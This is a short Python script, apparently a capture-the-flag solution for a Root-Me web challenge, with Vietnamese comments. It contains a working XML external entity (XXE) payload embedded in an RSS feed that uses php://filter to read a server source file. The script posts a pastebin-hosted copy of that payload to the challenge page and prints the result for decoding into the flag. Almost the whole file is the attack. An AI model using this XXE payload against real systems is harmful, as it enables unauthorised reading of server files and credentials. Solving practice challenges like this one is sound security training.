import requests
from bs4 import BeautifulSoup

url = "http://challenge01.root-me.org/web-serveur/ch29/index.php"

# khai thác xxe với định dạng rss
# <?xml version="1.0" encoding="UTF-8"?>
#<!DOCTYPE title [ <!ELEMENT title ANY >
#<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
#<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
#<channel>
#<title>The Blog</title>
#<link>http://example.com/</link>
#<description>A blog about things</description>
#<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
#<item>
#<title>&xxe;</title>
#<link>http://example.com</link>
#<description>a post</description>
#<author>author@example.com</author>
#<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
#</item>
#</channel>
#</rss>""

url_payload= "https://pastebin.com/raw/3dCBgc1B"

x = requests.post(url,data={"url":url_payload})

print(x.content)
# tu decode ra flag
